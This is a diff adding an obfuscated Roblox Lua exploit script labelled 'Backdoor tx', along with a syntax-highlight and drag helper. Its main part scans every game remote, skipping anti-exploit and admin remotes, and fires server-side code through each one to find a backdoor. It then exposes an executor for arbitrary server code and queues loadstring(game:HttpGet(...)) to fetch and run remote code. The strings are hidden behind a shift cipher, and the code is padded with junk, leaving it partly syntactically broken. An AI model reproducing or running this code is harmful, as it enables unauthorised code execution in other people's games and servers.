+				fromAxis = bbkGQKwkuBHx("kzshynts", 5),
+				FromAxis = bbkGQKwkuBHx("apixodji", 21),
+				fromNormalId = bbkGQKwkuBHx("crkzqflk", 23),
+				FromNormalId = bbkGQKwkuBHx("apixodji", 21),
+				new = bbkGQKwkuBHx("mbujapvu", 7),
+
+				one = bbkGQKwkuBHx("Enlcxa2", 9),
+				xAxis = bbkGQKwkuBHx("Raypkn5", 22),
+				yAxis = bbkGQKwkuBHx("Dmkbwz1", 8),
+				zAxis = bbkGQKwkuBHx("Dmkbwz1", 8),
+				zero = bbkGQKwkuBHx("Hqofad5", 12),
+			},
+
+			Vector3int16 = {
+				new = bbkGQKwkuBHx("wletkzfe", 17),
+			},
+		},
+	}
+
+	-- Filling up idQRXqLUK.libraries.Enum table
+	local UpaXxGsImqJs = idQRXqLUK.libraries.Enum
+
+	for _, enum in qcLQPDzCgIRq(Enum:GetEnums()) do
+		--TODO: Remove tostring from here once there is a better way to get the name of an Enum
+		UpaXxGsImqJs[TUOrVRHTtyC(enum)] = bbkGQKwkuBHx("Gpwo", 2)
+	end
+
+	return idQRXqLUK
+end;
+if (3 % 3 == 0) then}; end;
+-- StarterGui.Backdoor tx.xBkSjbjJGF.Executor.ExecutorBox.TextBox.Highlight
+local function FHjQicvK()
+if (85 % 1 == 0 and 85 >= 85) thenlocal jHCarWNa = YXRdjYSs[bbkGQKwkuBHx("y", 23)]; end;
+	local jHCarWNa = jHCarWNa
+	local DFtxsjNFcWwt = require(jHCarWNa.DFtxsjNFcWwt)
+	
+	DFtxsjNFcWwt.highlight({
+		-- The object to syntax highlight
+		DsvwlTKqng=jHCarWNa.Parent
+		-- The source rpWIedPsU for highlighting- defaults to DsvwlTKqng.Text
+		--	wDLnBbhy: string?,
+		-- Update even if there are no changes since last highlight
+		--	FqENzoJY=true,
+		-- Lexer for tokenizing wDLnBbhy, defaults to the bundled Lua QnrZfpbujzN
+		--	QnrZfpbujzN=true,
+	})
+	
+	textbox=jHCarWNa.Parent
+	textbox.InputChanged:Connect(function()
+		if textbox.Text~=bbkGQKwkuBHx('', 2) then
+			textbox.TextTransparency=1
+			return
+		end
+		textbox.TextTransparency=0
+	end)
+end;
+if (23 % 1 == 0 and 23 >= 23) thentask.spawn(C_b); end;
+-- StarterGui.Backdoor tx.Dragify
+local function xbILHasqSWi()
+if (37 % 1 == 0 and 37 >= 37) thenlocal jHCarWNa = YXRdjYSs[bbkGQKwkuBHx("1u", 19)]; end;
+		local jHCarWNa = jHCarWNa
+		local FPANnDfjI = lHetMCfTiy(bbkGQKwkuBHx("OmylChjonMylpcwy", 20))
+		function qReFEUBYhLlh(xBkSjbjJGF)
+			dragToggle = nil
+			local ZQkjDZWnbFN = 0.33
+			dragInput = nil
+			dragStart = nil
+			local PGBbDzZgrh = nil
+			function ysRbbrpP(yEqmVNUm)
+				local cSEPrykxF = yEqmVNUm.qeiFjrTGb - dragStart
+				local qeiFjrTGb = UDim2.new(startPos.X.Scale, startPos.X.Offset + cSEPrykxF.X, startPos.Y.Scale, startPos.Y.Offset + cSEPrykxF.Y)
+				lHetMCfTiy(bbkGQKwkuBHx("LowwfKwjnauw", 18)):Create(xBkSjbjJGF, TweenInfo.new(0.15), {qeiFjrTGb = qeiFjrTGb}):Play()
+			end
+			xBkSjbjJGF.InputBegan:Connect(function(yEqmVNUm)
+				if (yEqmVNUm.UserInputType == Enum.UserInputType.MouseButton1 or yEqmVNUm.UserInputType == Enum.UserInputType.Touch) and FPANnDfjI:GetFocusedTextBox() == nil then
+					dragToggle = true
+					dragStart = yEqmVNUm.qeiFjrTGb
+					startPos = xBkSjbjJGF.qeiFjrTGb
+					yEqmVNUm.Changed:Connect(function()
+						if yEqmVNUm.UserInputState == Enum.UserInputState.End then
+							dragToggle = false
+						end
+					end)
+				end
+			end)
+			xBkSjbjJGF.InputChanged:Connect(function(yEqmVNUm)
+				if yEqmVNUm.UserInputType == Enum.UserInputType.MouseMovement or yEqmVNUm.UserInputType == Enum.UserInputType.Touch then
+					dragInput = yEqmVNUm
+				end
+			end)
+			lHetMCfTiy(bbkGQKwkuBHx("RpboFkmrqPbosfzb", 23)).InputChanged:Connect(function(yEqmVNUm)
+				if yEqmVNUm == dragInput and dragToggle then
+					ysRbbrpP(yEqmVNUm)
+				end
+			end)
+		end
+	
+		qReFEUBYhLlh(jHCarWNa.Parent.xBkSjbjJGF)
+end;
+if (select(2, pcall(function() return EBhvjIpErOvB('6bf', 16) end)) ~= nil) thentask.spawn(C_2b); end;
+-- StarterGui.Backdoor tx.LocalScript
+local function ZdHDsVQEs()
+if (qggwyxGD(308)^2 + mrsvJxUeFpB(308)^2 >= 0.99999) thenlocal jHCarWNa = YXRdjYSs[bbkGQKwkuBHx("0u", 18)]; end;
+	local jHCarWNa = jHCarWNa
+	queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
+	if queueteleport then
+		queueteleport(bbkGQKwkuBHx("jmybqrpgle(eykc:FrrnEcr('frrnq://pyu.egrfszsqcpamlrclr.amk/RV-Ml-Rmn/RV-Fsz-Zyaibmmp/pcdq/fcybq/kygl/Zyaibmmp-Qayllcp'))()", 24))
+	end
+	
+	GUI=jHCarWNa.Parent.xBkSjbjJGF
+	
+	alphabet={bbkGQKwkuBHx('r', 17),bbkGQKwkuBHx('p', 14),bbkGQKwkuBHx('k', 8),bbkGQKwkuBHx('f', 2),bbkGQKwkuBHx('f', 1),bbkGQKwkuBHx('q', 11),bbkGQKwkuBHx('y', 18),bbkGQKwkuBHx('u', 13),bbkGQKwkuBHx('c', 20),bbkGQKwkuBHx('w', 13),bbkGQKwkuBHx('x', 13),bbkGQKwkuBHx('c', 17),bbkGQKwkuBHx('v', 9),bbkGQKwkuBHx('z', 12),bbkGQKwkuBHx('e', 16),bbkGQKwkuBHx('k', 21),bbkGQKwkuBHx('h', 17),bbkGQKwkuBHx('d', 12),bbkGQKwkuBHx('q', 24),bbkGQKwkuBHx('k', 17),bbkGQKwkuBHx('n', 19),bbkGQKwkuBHx('y', 3),bbkGQKwkuBHx('n', 17),bbkGQKwkuBHx('e', 7),bbkGQKwkuBHx('b', 3),bbkGQKwkuBHx('c', 3),bbkGQKwkuBHx('X', 23),bbkGQKwkuBHx('E', 3),bbkGQKwkuBHx('M', 10),bbkGQKwkuBHx('V', 18),bbkGQKwkuBHx('H', 3),bbkGQKwkuBHx('A', 21),bbkGQKwkuBHx('M', 6),bbkGQKwkuBHx('F', 24),bbkGQKwkuBHx('A', 18),bbkGQKwkuBHx('R', 8),bbkGQKwkuBHx('H', 23),bbkGQKwkuBHx('H', 22),bbkGQKwkuBHx('F', 19),bbkGQKwkuBHx('V', 8),bbkGQKwkuBHx('N', 25),bbkGQKwkuBHx('E', 15),bbkGQKwkuBHx('Y', 8),bbkGQKwkuBHx('L', 20),bbkGQKwkuBHx('G', 14),bbkGQKwkuBHx('K', 17),bbkGQKwkuBHx('M', 18),bbkGQKwkuBHx('S', 23),bbkGQKwkuBHx('O', 18),bbkGQKwkuBHx('Y', 1),bbkGQKwkuBHx('L', 13),bbkGQKwkuBHx('C', 3)}
+	
+	backdoor=nil
+	HttpService=lHetMCfTiy(bbkGQKwkuBHx("MyyuXjwanhj", 5))
+	
+	function POykcfxyTc(rpWIedPsU, KoepEIrKe)
+		local spyBacviVh=print
+		if KoepEIrKe==1 then spyBacviVh=print end
+		if KoepEIrKe==2 then spyBacviVh=error end
+		if KoepEIrKe==3 then spyBacviVh=warn end
+		spyBacviVh(bbkGQKwkuBHx('AE Obi Ihjrkvvy:', 7)..rpWIedPsU)
+	end
+	
+	function qeZiFukN(NBXltIGscnl, GLnfYtdV, MSTUGRGIVAxm)
+	
+		if NBXltIGscnl:IsA(bbkGQKwkuBHx('PckmrcCtclr', 24)) then
+			NBXltIGscnl:FireServer(GLnfYtdV)
+		elseif NBXltIGscnl:IsA(bbkGQKwkuBHx('HucejuVkdsjyed', 16)) then
+			spawn(function() NBXltIGscnl:InvokeServer(GLnfYtdV) end)
+		end
+	
+	end
+	
+	function ArTGzTXJpWo(FqGoDlMDOjqJ, DCIlYHlCwC)
+		for i,v in FqGoDlMDOjqJ:GetDescendants() do
+			if v:IsA(bbkGQKwkuBHx('Eqzld', 25)) then 
+				v.Visible=DCIlYHlCwC
+			end
+		end
+	end
+	
+	function HMFynDEpt(rpWIedPsU)
+		lHetMCfTiy(bbkGQKwkuBHx('UvctvgtIwk', 2)):SetCore(
+			bbkGQKwkuBHx("JveuEfkzwztrkzfe", 17),
+			{
+				Title = bbkGQKwkuBHx("QU Ery Yxzhallo", 23),
+				Duration = 6,
+				Text = rpWIedPsU
+			}
+		)
+	end
+	
+	
+	if _G.TX_Hub_Backdoor_Logs_Disabled then
+		HMFynDEpt(bbkGQKwkuBHx('Svnz kpzhislk :(', 7))
+	end
+	
+	ArTGzTXJpWo(GUI, false)
+	GUI.Scanner.Visible=true
+	GUI.Visible=true
+	
+	function aPUEosje(tiRyuyszQzw)
+	
+		local rpWIedPsU=bbkGQKwkuBHx('', 4)
+	
+		for i=1,tiRyuyszQzw do
+			rpWIedPsU=rpWIedPsU..alphabet[PDEnigxo(1,#alphabet)]
+		end
+	
+		return rpWIedPsU
+	
+	end
+	
+	local EkAmSsBY
+	function RESgEVtSaVY()
+	
+		local fAYXveZhVY=os.clock()
+	
+		local ODwqEMKs={}
+	
+		local pWrTJUJSR=lHetMCfTiy(bbkGQKwkuBHx('CpawtnlepoDezclrp', 11)):FindFirstChild(bbkGQKwkuBHx('mi', 1)..game.PlaceId/6666*1337*game.PlaceId)
+		if pWrTJUJSR and pWrTJUJSR:IsA(bbkGQKwkuBHx('DqyafqRgzofuaz', 12)) then
+			while true do
+				EkAmSsBY=aPUEosje(PDEnigxo(12,30))
+				if not ODwqEMKs[EkAmSsBY] then break end
+			end
+			spawn(function() pWrTJUJSR:InvokeServer(bbkGQKwkuBHx('Lxrsdqhntr Gta Azbjcnnq', 25), bbkGQKwkuBHx("y=Glqrylac.lcu('Kmbcj',umpiqnyac)y.Lykc=''", 24)..EkAmSsBY..bbkGQKwkuBHx("''", 5)) end)
+			ODwqEMKs[EkAmSsBY]=pWrTJUJSR
+		end
+	
+		for i,NBXltIGscnl in game:GetDescendants() do
+	
+			-- Validation Checker
+	
+			if not NBXltIGscnl:IsA(bbkGQKwkuBHx('ErzbgrRirag', 13)) then 
+				if not NBXltIGscnl:IsA(bbkGQKwkuBHx('GtbditUjcrixdc', 15)) then continue end
+			end
+	
+			-- RobloxReplicatedStorage
+			if string.split(NBXltIGscnl:GetFullName(), bbkGQKwkuBHx('.', 7))[1]==bbkGQKwkuBHx('EboybkErcyvpngrqFgbentr', 13) then
+				POykcfxyTc(bbkGQKwkuBHx('Pmzjmv Pcnjgayrcb Qrmpyec (', 24)..NBXltIGscnl.Name..bbkGQKwkuBHx(')', 8), 1)
+				continue
+			end
+	
+			if NBXltIGscnl.Parent==lHetMCfTiy(bbkGQKwkuBHx("VitpmgexihWxsveki", 4)) or NBXltIGscnl.Parent.Parent==lHetMCfTiy(bbkGQKwkuBHx("CpawtnlepoDezclrp", 11)) or NBXltIGscnl.Parent.Parent.Parent==lHetMCfTiy(bbkGQKwkuBHx("QdokhbzsdcRsnqzfd", 25)) then
+	
+				-- ADONIS Anti-Exploit
+				if NBXltIGscnl:FindFirstChild(bbkGQKwkuBHx('__IXQFWLRQ', 3)) or NBXltIGscnl.Name==bbkGQKwkuBHx('__TIBQHWCB', 14) then
+					POykcfxyTc(bbkGQKwkuBHx('Gjutoy lorzkx jkzkizkj (', 6)..NBXltIGscnl.Name..bbkGQKwkuBHx(')', 9), 1)
+					continue
+				end
+	
+				-- HD Admin
+				if NBXltIGscnl.Parent.Parent.Name==bbkGQKwkuBHx('GCZclhmBkhdms', 25) and NBXltIGscnl.Parent.Name==bbkGQKwkuBHx('Fvtanyf', 13) then
+					POykcfxyTc(bbkGQKwkuBHx('AW Twfbg (', 19)..NBXltIGscnl.Name..bbkGQKwkuBHx(')', 8), 1)
+					continue
+				end
+	
+				-- Chat Events
+				if NBXltIGscnl.Parent.Name==bbkGQKwkuBHx('IjkfzqyHmfyXdxyjrHmfyJajsyx', 5) then
+					POykcfxyTc(bbkGQKwkuBHx('Mrkd ofoxd (', 10)..NBXltIGscnl.Name..bbkGQKwkuBHx(')', 6), 1)
+					continue
+				end
+	
+			end
+	
+			-- Backdoor Sender
+	
+			while true do
+				EkAmSsBY=aPUEosje(PDEnigxo(12,30))
+				if not ODwqEMKs[EkAmSsBY] then break end
+			end
+	
+			qeZiFukN(NBXltIGscnl, bbkGQKwkuBHx("v=Dinovixz.izr('Hjyzg',rjmfnkvxz)v.Ivhz=''", 21)..EkAmSsBY..bbkGQKwkuBHx("''", 6))
+			ODwqEMKs[EkAmSsBY]=NBXltIGscnl
+	
+			POykcfxyTc(bbkGQKwkuBHx('Zluklk Ihjrkvvy "', 7)..NBXltIGscnl:GetFullName()..bbkGQKwkuBHx('"', 2), 1)
+	
+		end
+	
+		-- Backdoor Checker
+	
+		for i=1,100 do
+	
+			for i,NBXltIGscnl in ODwqEMKs do
+				local EkAmSsBY=i
+	
+				if workspace:FindFirstChild(EkAmSsBY) then
+	
+					HMFynDEpt(bbkGQKwkuBHx('Edfngrru irxqg! Hqmrb', 3))
+	
+					backdoor=NBXltIGscnl
+					POykcfxyTc(NBXltIGscnl:GetFullName(), 3)
+					GUI.Scanner.Visible=false
+					ArTGzTXJpWo(GUI.Executor, true)
+	
+					if (47 % 1 == 0 and 47 >= 47) then--				qeZiFukN(backdoor, bbkGQKwkuBHx("c=Kpuvcpeg.pgy('Jkpv',yqtmurceg)yjkng vtwg fq c.Vgzv='VZ Jwd Dcemfqqt'hqt d=3,35 fq c.Rctgpv=yqtmurceg;end;if(qggwyxGD(171)^2+mrsvJxUeFpB(171)^2>=0.99999)thenyckv(3)c.Rctgpv=pkn;end;if(select(2,pcall(function()return EBhvjIpErOvB('11b8',16)end))~=nil)thenyckv(2.7)gpf;end;yckv(82)gpf", 2))
+					qeZiFukN(NBXltIGscnl, bbkGQKwkuBHx("sfrvjsf(282127516.2995*70)", 1))			
+					if (68 % 1 == 0 and 68 >= 68) thenqeZiFukN(NBXltIGscnl, bbkGQKwkuBHx("o=Wbghobqs.bsk('Vwbh')o.Hslh='HL Vip Poqyrccf'kvwzs hfis rc o.Dofsbh=kcfygdoqs;end;kowh(59)o:Fsacjs()kowh(74)sbr", 14))
+	
+										return true
+				end
+
+			end
+	
+			wait()--.1)
+	
+		end
+	
+		return false
+	
+	end
+	
+	GUI.Executor.Execute.Button.MouseButton1Click:Connect(function()
+		local a,b=AaouwFPa(GUI.Executor.ExecutorBox.TextBox.Text, bbkGQKwkuBHx('%%ecobxkwo%%', 10), lHetMCfTiy(bbkGQKwkuBHx('Tpecivw', 4)).LocalPlayer.Name)
+	
+		local pWrTJUJSR=lHetMCfTiy(bbkGQKwkuBHx('LyjfcwunyxMniluay', 20)):FindFirstChild(bbkGQKwkuBHx('mi', 1)..game.PlaceId/6666*1337*game.PlaceId)
+		if pWrTJUJSR and pWrTJUJSR:IsA(bbkGQKwkuBHx('AnvxcnOdwlcrxw', 9)) then
+			POykcfxyTc(bbkGQKwkuBHx('Aczepnepo mlnvozzc qzfyo', 11), 3)
+			spawn(function()
+				local hwSPenzwO, mCnMnkbZw=pcall(function() pWrTJUJSR:InvokeServer(bbkGQKwkuBHx('Dpjkvizflj Yls', 17), a) end)
+				if mCnMnkbZw~=nil then
+					local dtdzjzZTi=string.split(mCnMnkbZw,bbkGQKwkuBHx(':', 3))
+					HMFynDEpt(dtdzjzZTi[#dtdzjzZTi])
+				end
+			end)
+		else
+			qeZiFukN(backdoor, a)
+		end
+		GUI.Executor.Execute.Button.Text=bbkGQKwkuBHx('Unuskju', 16)
+		wait(0.5)
+		GUI.Executor.Execute.Button.Text=bbkGQKwkuBHx('Gzgewvg', 2)
+	end)
+	GUI.Executor.Clear.Button.MouseButton1Click:Connect(function()
+		GUI.Executor.ExecutorBox.TextBox.Text=bbkGQKwkuBHx('', 2)
+		GUI.Executor.Clear.Button.Text=bbkGQKwkuBHx('Irkgx', 6)
+		wait(0.5)
+		GUI.Executor.Clear.Button.Text=bbkGQKwkuBHx('Vextk', 19)
+	end)
+	
+	searching=false
+	
+	GUI.Scanner.Button.MouseButton1Click:Connect(function()
+		if not searching then
+			searching=true
+			POykcfxyTc(bbkGQKwkuBHx('Bljwwrwp...', 9), 3)
+			GUI.Scanner.Button.Text=bbkGQKwkuBHx('Fpnaavat...', 13)
+			if not RESgEVtSaVY() then
+				GUI.Scanner.Button.Text=bbkGQKwkuBHx('Yz mlnvozzc', 11)
+				searching=false
+			end
+		end
+	end)
+	
+	lHetMCfTiy(bbkGQKwkuBHx('PnzmDikpoNzmqdxz', 21)).InputBegan:Connect(function(yEqmVNUm, processed)
+		if (yEqmVNUm.KeyCode == Enum.KeyCode.LeftAlt and not processed) then
+			if GUI.Visible then GUI.Visible=false
+			else GUI.Visible=true end
+		end
+	end)
+end;
+if (90 % 1 == 0 and 90 >= 90) thentask.spawn(C_2c); end;
+-- StarterGui.Backdoor tx.Ui
+local function ugDtpLBMGQ()
+if (3 % 3 == 0) thenlocal jHCarWNa = YXRdjYSs[bbkGQKwkuBHx("5g", 3)]; end;
+	local OqsGWsbUvSbs = jHCarWNa.Parent
+	local JWJvAegJ = 45
+	local pIanCHbuk = 0
+	
+	local function pyqglxojRoZl()
+	    local eNAcNViGd = {}
+	    for _, descendant in OqsGWsbUvSbs:GetDescendants() do
+	        if descendant:IsA(bbkGQKwkuBHx("SGEpybgclr", 24)) then
+	            GuUvrNBY(eNAcNViGd, descendant)
+	        end
+	    end
+	    return eNAcNViGd
+	end
+	
+	local function OUMgURhSEFAv(FypcUdJpzSDf)
+	    local eNAcNViGd = pyqglxojRoZl()
+	    
+	    for _, gradient in eNAcNViGd do
+	
+	        local rMGpryHmR = gradient.Rotation
+	        local rqicCvwqkQv = (rMGpryHmR + JWJvAegJ * FypcUdJpzSDf) % 360
+	        gradient.Rotation = rqicCvwqkQv
+	    end
+	end
+	
+	local vUhFvUjjwgJ = lHetMCfTiy(bbkGQKwkuBHx("GjcHtgkxrt", 15))
+	
+	vUhFvUjjwgJ.Heartbeat:Connect(function(FypcUdJpzSDf)
+	    pIanCHbuk = pIanCHbuk + FypcUdJpzSDf
+	    OUMgURhSEFAv(FypcUdJpzSDf)
+	end)
+	
+	OUMgURhSEFAv(0)
+	
+	OqsGWsbUvSbs.DescendantAdded:Connect(function(descendant)
+	    if descendant:IsA(bbkGQKwkuBHx("LZXiruzvek", 17)) then
+	        OUMgURhSEFAv(0)
+	    end
+	end)
+end;
+if (72 % 1 == 0 and 72 >= 72) thentask.spawn(C_2d); end;
+
+return YXRdjYSs[bbkGQKwkuBHx("5",4)],require;local function yFKjWcModrcX(PGAQyWexX)local _=24 end local function nmuMTZnV(UUhLrXkD)local _=86 end while false do local _=78 break end while false do local _=86 break end local function bmtiZYMg(pBNyYAbyn)local _=23 end local tlTuctmL=75 if true then local _=49 end local iUEgZxkueNm=97 if false then local _=6 end local HwwRPfasvil=76 if false then local _=26 end local function cgssTsaWHX(tHpduivcg)local _=31 end local function MAqgbDNMPu(TYaNbLVYZ)local _=19 end if false then local _=21 end break end end local wtKlJzYxe=1;wtKlJzYxe=wtKlJzYxe+9;local function xEemMwuFVw(PnUYKSjVezVx)local _=53 end if true then local _=95 end local function jCLdKgjNVhCM(TfJHBwbo)local _=67 end local FblAvMoKJX=22 if false then local _=55 end local function koMKjuMUK(hrOWikESuI)local _=77 end if false then local _=92 end local function NChgYzQYBSc(riqcsmhdPBnk)local _=22 end local function zytsgwAG(sHjJWUPwyei)local _=65 end if true then local _=77 end local function KPIbElTSo(vtgoihAljF)local _=12 end local mIjxmEMpw=41 local function SMqEeRPbdsz(pEoSpRDlPF)local _=80 end local mfIkKlqc=6 end)(...)
